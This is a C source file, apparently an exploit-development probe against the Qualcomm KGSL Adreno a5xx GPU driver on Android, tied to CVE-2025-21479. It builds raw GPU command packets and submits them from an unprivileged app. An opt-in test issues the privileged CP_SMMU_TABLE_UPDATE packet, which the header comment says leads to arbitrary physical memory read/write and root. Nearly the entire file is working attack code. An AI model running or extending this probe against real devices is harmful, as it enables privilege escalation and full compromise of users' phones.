/* kgsl-cp.c — a5xx CP command-execution probe (cheese / CVE-2025-21479 technique).
 *
 * Question: can an untrusted_app get the a5xx CP to execute a user-supplied
 * command stream (plain IB, then a CP_SET_DRAW_STATE draw-state), including
 * the privileged CP_SMMU_TABLE_UPDATE?  If CP_SMMU_TABLE_UPDATE executes we get
 * arbitrary physical R/W (TTBR0 control) -> root, independent of 1905/0920.
 *
 * Test A: plain IB  -> CP_MEM_WRITE marker to a GPU buffer, read back.
 * Test B: draw-state stream -> CP_MEM_WRITE marker, read back.
 * Test C: draw-state stream -> CP_SMMU_TABLE_UPDATE(ttbr0=junk) then marker;
 *         if the GPU reboots/hangs, the privileged packet executed.
 *
 * No corruption unless C actually executes (that is the point).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpumem_free_id { unsigned int id, __pad; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp;
};
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_alloc_id)
#define IOCTL_PMEM_FREE_ID  _IOWR(KGSL_IOC_TYPE, 0x35, struct kgsl_gpumem_free_id)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

#define KGSL_CONTEXT_PREAMBLE      0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8

#define CP_MEM_WRITE       0x3d
#define CP_SET_DRAW_STATE  0x43
#define CP_SET_MODE        0x63
#define CP_SMMU_TABLE_UPDATE 0x53
#define CP_WAIT_FOR_IDLE   0x26

static unsigned int parity(unsigned int v){
    v ^= v>>16; v ^= v>>8; v ^= v>>4; v &= 0xf;
    return (0x9669u >> v) & 1;
}
/* a5xx: not legacy PM4 -> type7. cnt = number of payload dwords. */
static unsigned int t7(unsigned int op, unsigned int cnt){
    cnt &= 0x3fff; op &= 0x7f;
    return (7u<<28) | cnt | (parity(cnt)<<15) | (op<<16) | (parity(op)<<23);
}
/* cp_gpuaddr: lo, hi for non-legacy */
static unsigned int *put_addr(unsigned int *p, uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }

static void dump32(const char *tag, uint32_t *p, int n){
    printf("%s:", tag);
    for(int i=0;i<n;i++){ printf(" %08x", p[i]); if(i%4==3)printf("\n     "); }
    printf("\n");
}

static int alloc_buf(int fd, size_t sz, unsigned *id, unsigned long *gpu, void **map){
    struct kgsl_gpumem_alloc_id al; memset(&al,0,sizeof al); al.size=sz; al.flags=0;
    if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&al)<0) return -1;
    *id=al.id; *gpu=al.gpuaddr;
    size_t msz = al.mmapsize ? al.mmapsize : al.size;
    void *p = mmap(NULL,msz,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)al.id<<12);
    if(p==MAP_FAILED) return -1;
    memset(p,0,msz);
    *map=p;
    return 0;
}

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("== kgsl a5xx CP-exec probe (uid=%d) ==\n",(int)getuid());
    int fd=open("/dev/kgsl-3d0",O_RDWR);
    if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }

    unsigned cid=0; unsigned long cgpu=0; void *cmap=NULL;
    unsigned mid=0; unsigned long mgpu=0; void *mmap_=NULL;
    if(alloc_buf(fd,0x10000,&cid,&cgpu,&cmap)){ printf("[-] alloc cmd: %s\n",strerror(errno)); return 1; }
    if(alloc_buf(fd,0x10000,&mid,&mgpu,&mmap_)){ printf("[-] alloc mark: %s\n",strerror(errno)); return 1; }
    printf("[+] cmd gpu=0x%lx map=%p | marker gpu=0x%lx map=%p\n",cgpu,cmap,mgpu,mmap_);

    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags = KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    if(ioctl(fd,IOCTL_CTXT_CREATE,&cc)<0){ printf("[-] ctxt: %s\n",strerror(errno)); return 1; }
    printf("[+] ctx id=%u\n",cc.drawctxt_id);

    uint32_t *cmd = cmap;
    uint32_t *mark = mmap_;
    uint32_t *ds = (uint32_t*)((char*)cmap + 0x8000);       /* draw-state buffer */
    unsigned long ds_gpu = cgpu + 0x8000;

#define SUBMIT(ib_dwords, label) do {                                    \
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);           \
    cob.gpuaddr=(uint64_t)cgpu; cob.size=(uint64_t)((ib_dwords)*4); cob.flags=KGSL_CMDLIST_IB; \
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);               \
    mo.gpuaddr=(uint64_t)cgpu; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=cid; \
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);                 \
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=cc.drawctxt_id;        \
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1; \
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;   \
    errno=0; int r=ioctl(fd,IOCTL_GPU_COMMAND,&gc);                      \
    printf("[%c] %s rc=%d errno=%d ts=%u\n", r==0?'+':'-', label, r, errno, gc.timestamp); \
} while(0)

    /* ---- Test A: plain IB, CP_MEM_WRITE marker 0x11111111 ---- */
    memset(cmd,0,0x8000);
    uint32_t *p=cmd;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,mgpu); *p++=0x11111111u;
    dump32("  [A ib]",cmd,(int)(p-cmd));
    mark[0]=0; SUBMIT((int)(p-cmd),"A plain CP_MEM_WRITE");
    usleep(200000);
    printf("    mark[0]=%08x %s\n", mark[0], mark[0]==0x11111111u?"<<< GPU WROTE":"(no write)");

    /* ---- Test B: draw-state path, several a5xx encodings ---- */
    {
        /* build draw-state stream at ds (offset 0x8000) */
        uint32_t *d=ds;
        *d++=t7(CP_MEM_WRITE,3); d=put_addr(d,mgpu); *d++=0x22222222u;
        unsigned ds_dw=(unsigned)(d-ds);
        struct { unsigned hdr; const char *nm; } enc[] = {
            { (0x8u<<16)|0u, "grp0 imm(8)" },
            { (0x1u<<16)|0u, "grp0 dirty(1)" },
            { (0x9u<<16)|0u, "grp0 imm|dirty" },
            { (1u<<24)|(0x8u<<16), "grp1 imm(8)" },
            { 0u | (0x7u<<20), "A730 modes<<20" },
        };
        for (unsigned e=0; e<sizeof(enc)/sizeof(enc[0]); e++) {
            memset(cmd,0,0x8000);
            p=cmd;
            *p++=t7(CP_SET_MODE,1); *p++=1u;
            *p++=t7(CP_SET_DRAW_STATE,3);
            *p++= ds_dw | enc[e].hdr; p=put_addr(p,ds_gpu);
            mark[0]=0;
            printf("  [B%d] %s hdr=%08x\n", e, enc[e].nm, ds_dw|enc[e].hdr);
            SUBMIT((int)(p-cmd),"B draw-state");
            usleep(250000);
            printf("       mark[0]=%08x %s\n", mark[0], mark[0]==0x22222222u?"<<< DRAW-STATE EXECUTED":"(no write)");
        }
    }

    /* ---- Test C (opt-in via TESTC=1): plain-IB CP_SMMU_TABLE_UPDATE ---- */
    if (getenv("TESTC")) {
        memset(cmd,0,0x8000);
        p=cmd;
        *p++=t7(CP_SMMU_TABLE_UPDATE,3); *p++=0u; *p++=0u; *p++=0u;   /* TTBR0=0, ctxidr=0 */
        *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,mgpu); *p++=0x33333333u;
        mark[0]=0;
        printf("  [C] plain-IB CP_SMMU_TABLE_UPDATE(TTBR0=0) then MEM_WRITE 33333333...\n");
        SUBMIT((int)(p-cmd),"C1 SMMU_UPDATE+WRITE");
        usleep(400000);
        printf("    mark[0]=%08x  (33333333 => packet IGNORED/blocked; other => packet EXECUTED)\n", mark[0]);
        /* recovery check: plain MEM_WRITE only */
        memset(cmd,0,0x8000); p=cmd;
        *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,mgpu); *p++=0x44444444u;
        mark[0]=0; SUBMIT((int)(p-cmd),"C2 plain MEM_WRITE (recovery)");
        usleep(200000);
        printf("    mark[0]=%08x  %s\n", mark[0], mark[0]==0x44444444u?"<<< CP alive":"(CP dead/hung)");
    }

    if(cc.drawctxt_id){ struct kgsl_drawctxt_destroy x={cc.drawctxt_id}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    { struct kgsl_gpumem_free_id x={cid,0}; ioctl(fd,IOCTL_PMEM_FREE_ID,&x); }
    { struct kgsl_gpumem_free_id x={mid,0}; ioctl(fd,IOCTL_PMEM_FREE_ID,&x); }
    close(fd);
    printf("== done ==\n");
    return 0;
}
